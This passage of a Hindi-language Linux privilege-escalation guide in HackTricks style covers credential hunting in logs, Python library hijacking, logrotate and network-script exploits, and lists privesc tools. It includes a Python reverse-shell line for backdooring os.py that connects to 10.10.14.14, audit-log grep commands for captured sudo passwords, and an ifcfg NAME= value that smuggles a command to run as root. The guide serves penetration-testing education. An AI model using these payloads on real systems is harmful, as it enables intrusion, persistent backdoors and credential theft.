**एक और उपयोगी tool** जिसे आप इसके लिए इस्तेमाल कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), जो Windows, Linux और Mac के लिए local computer पर stored बहुत से passwords retrieve करने वाला एक open source application है।

### Logs

यदि आप logs पढ़ सकते हैं, तो आपको **उनके अंदर उपयोगी/confidential information मिल सकती है**। Log जितना अधिक अजीब होगा, वह उतना ही अधिक interesting होगा (संभवतः)।\
इसके अलावा, कुछ "**bad**" configured (backdoored?) **audit logs**, आपको **audit logs के अंदर passwords record करने की अनुमति दे सकते हैं**, जैसा कि इस post में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
लॉग्स **read** करने के लिए [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) group बहुत उपयोगी होगा।

### Shell फ़ाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन files की भी जाँच करनी चाहिए जिनके **name** या **content** में "**password**" शब्द हो, और logs के अंदर IPs तथा emails या hashes regexps की भी जाँच करनी चाहिए।\
मैं यहाँ यह सब करने के तरीकों की सूची नहीं देने वाला, लेकिन यदि आपकी रुचि है तो आप [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) द्वारा किए जाने वाले last checks देख सकते हैं।

## Writable files

### Python library hijacking

यदि आपको पता है कि python script **कहाँ से** execute होने वाली है और आप उस folder के **अंदर write कर सकते हैं** या **python libraries को modify कर सकते हैं**, तो आप OS library को modify करके उसमें backdoor डाल सकते हैं (यदि आप उस जगह write कर सकते हैं जहाँ python script execute होने वाली है, तो os.py library को copy और paste करें)।

**library में backdoor डालने** के लिए os.py library के अंत में बस निम्नलिखित line जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में मौजूद एक vulnerability उन users को, जिनके पास किसी log file या उसकी parent directories पर **write permissions** हैं, संभावित रूप से escalated privileges प्राप्त करने देती है। ऐसा इसलिए होता है क्योंकि `logrotate`, जो अक्सर **root** के रूप में चलता है, arbitrary files execute करने के लिए manipulate किया जा सकता है, विशेष रूप से _**/etc/bash_completion.d/**_ जैसी directories में। केवल _/var/log_ में ही नहीं, बल्कि उन सभी directories में permissions जांचना महत्वपूर्ण है जहां log rotation लागू है।

> [!TIP]
> यह vulnerability `logrotate` version `3.18.0` और उससे पुराने versions को प्रभावित करती है।

इस vulnerability की अधिक detailed जानकारी इस page पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)।

आप इस vulnerability को [**logrotten**](https://github.com/whotwagner/logrotten) के साथ exploit कर सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** के समान है, इसलिए जब भी आपको पता चले कि आप logs को alter कर सकते हैं, तो जांचें कि उन logs को कौन manage कर रहा है और क्या आप logs को symlinks से substitute करके privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी कारण से कोई user _/etc/sysconfig/network-scripts_ में **write** करने योग्य `ifcf-<whatever>` script बना सकता है **या** किसी existing script को **adjust** कर सकता है, तो आपका **system is pwned**।

Network scripts, उदाहरण के लिए _ifcg-eth0_, network connections के लिए उपयोग की जाती हैं। वे बिल्कुल .INI files जैसी दिखती हैं। हालांकि, Linux पर Network Manager (dispatcher.d) द्वारा उन्हें \~sourced\~ किया जाता है।

मेरे मामले में, इन network scripts में मौजूद `NAME=` attribute को सही तरीके से handle नहीं किया जाता। यदि name में **white/blank space** है, तो system **white/blank space** के बाद वाले हिस्से को execute करने का प्रयास करता है। इसका अर्थ है कि पहले blank space के बाद की **हर चीज root के रूप में execute** की जाती है।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network और /bin/id के बीच के blank space पर ध्यान दें_)

### **init, init.d, systemd, और rc.d**

`/etc/init.d` directory **scripts** के लिए है, जो System V init (SysVinit), **classic Linux service management system**, में उपयोग होती हैं। इसमें services को `start`, `stop`, `restart`, और कभी-कभी `reload` करने वाली scripts शामिल होती हैं। इन्हें सीधे या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से execute किया जा सकता है। Redhat systems में इसका वैकल्पिक path `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से संबंधित है, जो Ubuntu द्वारा शुरू किया गया एक नया **service management** system है और service management tasks के लिए configuration files का उपयोग करता है। Upstart पर transition के बावजूद, Upstart में मौजूद compatibility layer के कारण SysVinit scripts का उपयोग Upstart configurations के साथ अभी भी किया जाता है।

**systemd** एक आधुनिक initialization और service manager के रूप में सामने आता है, जो on-demand daemon starting, automount management और system state snapshots जैसी advanced features प्रदान करता है। यह distribution packages के लिए files को `/usr/lib/systemd/` में और administrator modifications के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे system administration process सरल हो जाती है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर privileged kernel functionality को userspace manager के लिए expose करने हेतु किसी syscall को hook करते हैं। कमजोर manager authentication (जैसे FD-order पर आधारित signature checks या कमजोर password schemes) किसी local app को manager का impersonation करने और पहले से rooted devices पर root तक escalate करने में सक्षम बना सकता है। अधिक जानकारी और exploitation details यहां देखें:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations में regex-driven service discovery process command lines से binary path extract कर सकता है और उसे privileged context में -v के साथ execute कर सकता है। Permissive patterns (जैसे \S का उपयोग) writable locations (जैसे /tmp/httpd) में attacker-staged listeners से match कर सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)।

अन्य discovery/monitoring stacks पर लागू होने वाला generalized pattern जानने और exploitation details देखने के लिए यहां देखें:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors खोजने के लिए Best tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux और MAC में kernel vulns enumerate करें [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
